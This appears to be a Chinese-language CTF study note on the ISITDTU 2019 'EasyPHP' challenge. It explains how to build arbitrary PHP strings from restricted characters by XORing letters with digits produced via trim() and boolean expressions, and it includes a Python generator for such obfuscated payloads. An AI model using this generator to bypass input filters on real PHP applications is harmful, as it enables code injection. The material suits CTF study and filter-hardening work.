# 例题或者启发
[CTFtime.org / ISITDTU CTF 2019 Quals / EasyPHP / Writeup](https://ctftime.org/writeup/15946)
### 原理
:::tips
通过布尔值为1的一些字符进行构造任意字符串<br />原理为<br />      [A-Z]^[0-9] = [a-z_]<br />      trim(string $str) = integer $num (eg. trim("123") = 123)<br />数值为1的字符举例<br />      !!a, (a==a)<br />形式为<br />      @ASD^trim(123)    =>  'paw'
:::
### 构造脚本
```python
"""
通过布尔值为1的一些字符进行构造任意字符串
原理为
      [A-Z]^[0-9] = [a-z_]
      trim(string $str) = integer $num (eg. trim("123") = 123)
数值为1的字符举例
      !!a, (a==a)
形式为
      @ASD^trim(123)    =>  'paw'
"""

def create_num(num):
    num_bin = bin(num)[2:]
    length = len(num_bin) - 1
    strr = ""
    for i in num_bin:
        if i == "1":
            if length >= 1:
                strr += "+(" + f"({char}+{char})**" + "(" + (f"{char}+"*length)[:-1] + ")" + ")"
            else:
                strr += f"+({char})"
        length -= 1
    return "(" + strr[1:] + ")"

def create_xor(target_str, allowed_char):
    num = ""
    strr = ""
    for i in target_str:
        for j in range(0, 10):
            sub_strr = chr(ord(i) ^ ord(str(j)))
            if sub_strr in allowed_char:
                num += str(j)
                strr += sub_strr
                break
    return num, strr


allowed_char = input("可使用的字符(eg. qwrtyuiahjklzxcvbnm):").upper()
char = input("数值为1的字符：")
target_str = input("所要生成的字符串：")
num, strr = create_xor(target_str, allowed_char)
num = create_num(int(num))
res = "(" + strr + "^" + f"trim({num})" + ")"
print(res)

```
